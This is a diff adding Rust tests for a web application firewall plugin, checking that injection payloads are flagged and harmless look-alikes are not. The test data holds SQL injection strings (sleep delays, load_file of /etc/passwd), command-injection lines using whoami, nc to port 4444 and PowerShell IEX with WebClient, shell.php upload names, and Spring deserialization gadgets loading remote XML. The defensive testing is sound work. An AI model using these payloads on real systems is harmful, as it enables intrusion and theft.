@@ -253,6 +253,66 @@ async fn unquoted_time_delay_shapes_are_level_one_in_bodies() {
     .await;
 }
 
+/// `ORDER BY` accepts the inline-comment separator, the number-then-operator
+/// shape accepts comparison operators, and a form pair may end at a `/*`
+/// comment. The number-then-operator shape counts only when it is the whole
+/// value, so compact code and a spreadsheet formula stay clean.
+#[tokio::test]
+async fn time_delay_body_shapes_accept_comments_and_skip_compact_code() {
+    let plugin = monitor_waf(1);
+    for body in [
+        br#"{"id":"1 ORDER/**/BY 1,sleep(5)"}"#.as_slice(),
+        br#"{"id":"1 order by 1/**/,sleep(5)"}"#,
+        br#"{"id":"1=sleep(5)"}"#,
+    ] {
+        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
+    }
+    for body in [b"id=sleep(5)/*x*/".as_slice(), b"a=1&id=1-sleep(5)/*"] {
+        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(FORM, body)).await;
+    }
+
+    for body in [
+        br#"{"code":"x=1+sleep(5)"}"#.as_slice(),
+        br#"{"cell":"=2*sleep(1)"}"#,
+        br#"{"code":"y = 2*sleep(1) + 3"}"#,
+    ] {
+        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
+    }
+    assert_clean(
+        &plugin,
+        "FE-SQLI-010-B",
+        Surface::Body(TEXT, b"x=1+sleep(5);\nprint(x)"),
+    )
+    .await;
+}
+
+/// A query value holds only the injected expression, so a number followed by
+/// an operator and a delay call at the start of the value is precise there.
+#[tokio::test]
+async fn numeric_context_time_delay_opens_the_query_value() {
+    let plugin = monitor_waf(1);
+    for query in [
+        "id=1-sleep(5)",
+        "id=1*sleep(5)",
+        "id=1%2Bsleep(5)",
+        "id=1/sleep(5)",
+        "id=1%5Esleep(5)",
+        "id=-1-sleep(5)",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-006", Surface::Query(query)).await;
+    }
+    for query in ["q=a-sleep(5)", "q=room%201-sleep(5)", "q=time.sleep(1)"] {
+        assert_clean(&plugin, "FE-SQLI-006", Surface::Query(query)).await;
+    }
+
+    // The level-2 body mirror shares the pattern: a body that opens with the
+    // expression matches it.
+    let level_two = monitor_waf(2);
+    for body in [b"1-sleep(5)".as_slice(), b"1*sleep(5)"] {
+        assert_detected(&level_two, "FE-SQLI-006-B", Surface::Body(TEXT, body)).await;
+    }
+}
+
 #[tokio::test]
 async fn catalog_enumeration_and_error_based_sqli_are_detected() {
     let plugin = monitor_waf(1);
@@ -346,6 +406,36 @@ async fn load_file_hex_literal_and_commented_argument_are_detected() {
     }
 }
 
+/// MySQL also reads a string or hex literal behind a charset introducer
+/// (`_latin1'…'`, `_binary 0x…`) and a `CONCAT_WS(` path. A leading
+/// underscore identifier or a macro call is still an ordinary argument, and a
+/// user variable is left out because Ruby writes `load_file(@path)`.
+#[tokio::test]
+async fn load_file_charset_introducer_and_concat_ws_are_detected() {
+    let plugin = monitor_waf(1);
+    for query in [
+        "q=union%20select%20load_file(_latin1'/etc/passwd')",
+        "q=union%20select%20load_file(_binary%200x2f6574632f706173737764)",
+        "q=union%20select%20load_file(concat_ws(0x2f,'','etc','passwd'))",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-008", Surface::Query(query)).await;
+    }
+    for body in [
+        b"1 union select load_file(_utf8mb4'/etc/passwd')".as_slice(),
+        b"1 union select load_file(CONCAT_WS(CHAR(47),'','etc','passwd'))",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
+    }
+    for body in [
+        b"data = load_file(_path)".as_slice(),
+        b"cfg = load_file(_T(\"app.conf\"))",
+        b"cfg = load_file(@path)",
+        b"cfg = loader.load_file(_latin1'/etc/app.conf')",
+    ] {
+        assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
+    }
+}
+
 #[tokio::test]
 async fn quoted_string_tautology_is_detected_including_unspaced_form() {
     let plugin = monitor_waf(1);
@@ -411,6 +501,35 @@ async fn like_tautology_requires_an_injection_shaped_right_operand() {
         b"Is it 'soda' or 'pop' like 'grandma' says?",
     ] {
         assert_clean(&plugin, "FE-SQLI-009-B", Surface::Body(TEXT, body)).await;
+    }
+}
+
+/// The comment after a `like` right operand may follow closing parentheses, a
+/// statement `;`, or a `LIMIT` clause.
+#[tokio::test]
+async fn like_tautology_comment_may_follow_parentheses_semicolon_or_limit() {
+    let plugin = monitor_waf(1);
+    for query in [
+        "user=x'%20or%20'a'%20like%20'a')--%20",
+        "user=x'%20or%20'a'%20like%20'a'))%23",
+        "user=x'%20or%20'a'%20like%20'a'%3B--%20",
+        "user=x'%20or%20'a'%20like%20'a'%20limit%201--%20",
+        "user=x'%20or%20'a'%20like%20'a'%20LIMIT%200,1%23",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
+    }
+    assert_detected(
+        &plugin,
+        "FE-SQLI-009-B",
+        Surface::Body(JSON, br#"{"user":"admin' or 'a' like 'a')-- "}"#),
+    )
+    .await;
+
+    for query in [
+        "q=Is%20it%20'soda'%20or%20'pop'%20like%20'grandma')%20or%20not%3F",
+        "q=Is%20it%20'soda'%20or%20'pop'%20like%20'grandma'%20limits%205%3F",
+    ] {
+        assert_clean(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
     }
 }
 
@@ -645,6 +764,45 @@ async fn newline_command_ignores_capitalised_prose_and_spaced_ampersand() {
         "note=pets%0Acat%20%26%20dog",
         "note=pets%0Acat%20%26lt;%20dog",
         "note=pets%0Acat%20%3E%20dog",
+    ] {
+        assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
+    }
+}
+
+/// `cmd.exe` and PowerShell resolve commands in any case, so a mixed-case
+/// Windows tool after a CR/LF counts when it ends the value, carries `.exe`,
+/// is followed by a shell operator or a flag, or (PowerShell) runs `iex` /
+/// `invoke-`. A short command followed by a spaced `#` comment or a spaced
+/// `&` that ends the value is a command too. Prose lines stay clean.
+#[tokio::test]
+async fn newline_command_catches_mixed_case_tools_spaced_comment_and_trailing_ampersand() {
+    let plugin = monitor_waf(1);
+    for query in [
+        "host=127.0.0.1%0AWhoami",
+        "host=127.0.0.1%0AWhoAmI",
+        "host=127.0.0.1%0AIpconfig",
+        "host=127.0.0.1%0ASysteminfo%20",
+        "host=127.0.0.1%0AWhoami.exe%20/all",
+        "host=127.0.0.1%0AWhoAmI|nc%20h%204444",
+        "host=127.0.0.1%0AIpconfig%20%3E%20/tmp/x",
+        "host=127.0.0.1%0APowershell%20IEX(New-Object%20Net.WebClient)",
+        "host=127.0.0.1%0APwsh%20Invoke-Expression%20x",
+        "host=127.0.0.1%0Aid%20%23",
+        "host=127.0.0.1%0Aid%20%23%20rest%20of%20the%20command",
+        "host=127.0.0.1%0Aid%20%26",
+        "host=127.0.0.1%0Aid%20%26%20",
+    ] {
+        assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
+    }
+    for query in [
+        "note=Tools%0APowerShell%20is%20great",
+        "note=Skills:%0APowerShell%0APython",
+        "note=Books:%0APowerShell%20-%20a%20primer",
+        "note=Skills:%0APowerShell%20%26%20Python",
+        "note=Opinion:%0APowerShell%20%3E%20Bash",
+        "note=Skills:%0APowerShell.",
+        "note=pets%0Acat%20%26%20dog",
+        "note=pets%0Acat%20%26amp;%20dog",
     ] {
         assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
     }
@@ -992,12 +1150,20 @@ async fn upload_filename_star_accepts_any_charset_and_language_tag() {
     }))
     .unwrap();
     let multipart = "multipart/form-data; boundary=b";
+    let long_charset = format!("filename*={}''shell.php", "x".repeat(60));
+    let long_tag = format!("filename*=UTF-8'{}'shell.php", "a".repeat(50));
     for filename in [
         "filename*=UTF-8'en'shell.php",
         "filename*=ISO-8859-1''shell.php",
         "filename*=utf-8''shell%2Ephp",
         "filename*=ISO-8859-1'de'shell.p%68p",
         "filename*=UTF-8'en-us'shell%2Ephp%2Ejpg",
+        // Lenient parsers split the prefix on `'` without checking it, so an
+        // underscore tag, an unusual charset, and a padded prefix all count.
+        "filename*=UTF-8'en_US'shell.php",
+        "filename*=UTF.8''shell.php",
+        long_charset.as_str(),
+        long_tag.as_str(),
     ] {
         let part = format!(
             "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
@@ -1118,6 +1284,35 @@ async fn spring_session_json_is_not_a_polymorphic_gadget() {
     for body in [
         br#"["org.springframework.security.core.authority.SimpleGrantedAuthority",{"authority":"ROLE_USER"}]"#.as_slice(),
         br#"{"@class":"org.springframework.session.MapSession","id":"5f1c","maxInactiveInterval":1800}"#,
+    ] {
+        assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
+    }
+}
+
+/// Jackson's `WRAPPER_ARRAY` also types a gadget built from one string
+/// (CVE-2017-17485: `["…FileSystemXmlApplicationContext","http://…"]`), and
+/// `org.springframework.web.context.support.` holds the web-context variants.
+/// A pair of package names, a longer class list, a Maven coordinate, a JDK
+/// value type, and Spring Security's own types stay clean.
+#[tokio::test]
+async fn spring_gadget_array_with_a_string_argument_is_detected() {
+    let plugin = monitor_waf(1);
+    for body in [
+        br#"["org.springframework.context.support.FileSystemXmlApplicationContext","http://x/spel.xml"]"#.as_slice(),
+        br#"{"a":["org.springframework.context.support.ClassPathXmlApplicationContext", "http://x/spel.xml"]}"#,
+        br#"["org.springframework.web.context.support.XmlWebApplicationContext",{"configLocation":"http://x/spel.xml"}]"#,
+        br#"["org.springframework.web.context.support.GroovyWebApplicationContext","http://x/a.groovy"]"#,
+    ] {
+        assert_detected(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
+    }
+    for body in [
+        br#"["org.springframework.security.core.authority.SimpleGrantedAuthority","ROLE_USER"]"#.as_slice(),
+        br#"["org.springframework.session.MapSession","5f1c"]"#,
+        br#"["org.springframework.web.servlet.DispatcherServlet","x"]"#,
+        br#"{"packages":["org.apache.commons","org.apache.http"]}"#,
+        br#"{"classes":["org.apache.Foo","org.apache.Bar","org.apache.Baz"]}"#,
+        br#"{"deps":["org.apache.commons:commons-lang3","3.12.0"]}"#,
+        br#"{"homepage":["java.net.URL","https://example.com/a"]}"#,
     ] {
         assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
     }
